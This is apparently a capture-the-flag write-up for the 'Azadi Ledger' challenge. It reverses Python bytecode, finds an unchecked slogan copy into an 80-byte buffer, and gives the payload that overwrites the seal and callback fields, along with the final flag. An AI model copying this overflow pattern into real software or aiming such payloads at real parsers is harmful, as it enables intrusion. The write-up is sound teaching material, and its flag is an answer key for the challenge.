# Azadi Ledger

## Challenge

**Related event:** U - AI Conversation Forensics  
**Points:** 200

## Files

- `azadi_ledger.pyc`
- `sample_ticket.bin`

## Recon

The challenge uses Python 3.12 bytecode.

The `.pyc` was loaded with `marshal.loads()` and inspected with Python's `dis` module to obtain the exact bytecode-level logic.

## Ticket Format

The parser expects:

```text
[0:4]                 magic "U6LG"
[4]                   name_len (1 byte)
[5:5+name_len]       name
next 2 bytes          slogan_len (<H)
following bytes       slogan
```

## Vulnerability

The processing function creates an 80-byte buffer:

```python
record = bytearray(80)
record[64:72] = struct.pack('<Q', _SEAL)
record[72:80] = struct.pack('<Q', 0)

for i, b in enumerate(slogan):
    record[i] = b
```

The bug is the missing bounds check on `slogan`.

A slogan longer than 64 bytes can overwrite the protected `seal` field and the `callback` field.

The program later performs:

```python
seal = record[64:72]
callback = record[72:80]

if seal != _SEAL:
    reject("ledger seal broken")

if callback == _WIN:
    _open_vault()
```

Therefore, an attacker can overwrite both fields.

## Exploit

Use a slogan of exactly 80 bytes:

```python
slogan = (
    b'A' * 64
    + struct.pack('<Q', 1821433463987681982)
    + struct.pack('<Q', 18395109851208007)
)
```

The layout is:

```text
bytes 0-63    filler
bytes 64-71   correct _SEAL
bytes 72-79   _WIN callback value
```

The complete ticket construction used:

```python
ticket = (
    b'U6LG'
    + bytes([len(name)])
    + name
    + struct.pack('<H', len(slogan))
    + slogan
)
```

Exactly 80 slogan bytes are important; longer input causes the Python bytearray assignment to fail.

## Verification

Executing the vulnerable bytecode with the crafted ticket produced:

```text
Volunteer: exploiter
Azadi ledger unlocked: UNI6CTF{Azadi_Ledger_Callback_Seized_1947!}
```

## Final Flag

The event wrapper is `TRIVARNA{...}`:

```text
TRIVARNA{Azadi_Ledger_Callback_Seized_1947!}
```
